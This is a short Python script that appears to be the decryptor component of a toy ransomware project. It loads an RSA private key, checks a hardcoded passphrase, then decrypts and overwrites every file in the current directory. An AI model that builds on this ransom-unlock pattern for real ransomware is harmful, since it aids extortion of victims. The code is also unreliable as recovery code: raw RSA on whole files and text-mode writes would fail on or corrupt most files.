import rsa
import os



#read my key
with open("seckey.pem","rb") as mykey:
	private_key=(rsa.PrivateKey.load_pkcs1(mykey.read().decode('utf8')) )

files=[]

for i in os.listdir():
	if i=='mal.py' or i=='seckey.pem' or i=='dec.py':
		continue
	if os.path.isfile(i):
		files.append(i)

print("Enter Layer.......................")
print("##################################")

Layer="sreesav"

user_input=input()

if user_input==Layer:
	for i in files:
		with open(i,"rb") as targets:
			contents=targets.read()
		with open(i,"w") as target:
			target.write(rsa.decrypt(contents, private_key).decode())
	print("Successful...............##################.....................")
else:
	print("Failed................####################...................")